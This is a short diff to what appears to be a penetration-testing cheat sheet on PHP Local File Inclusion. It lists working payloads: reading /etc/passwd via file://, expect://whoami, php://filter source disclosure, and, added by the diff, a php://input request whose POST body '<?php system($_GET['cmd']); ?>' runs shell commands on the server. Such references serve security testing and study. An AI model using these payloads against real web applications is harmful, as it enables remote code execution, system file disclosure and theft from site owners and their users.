@@ -233,8 +233,10 @@ Connection: close
 #### Local File Inclusion: Reading Files
 ```bash
 file:///etc/passwd
-php://input
-    send post data
+
+http://example.com/index.php?page=php://input&cmd=ls
+    POST: <?php system($_GET['cmd']); ?>
+
 expect://whoami
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
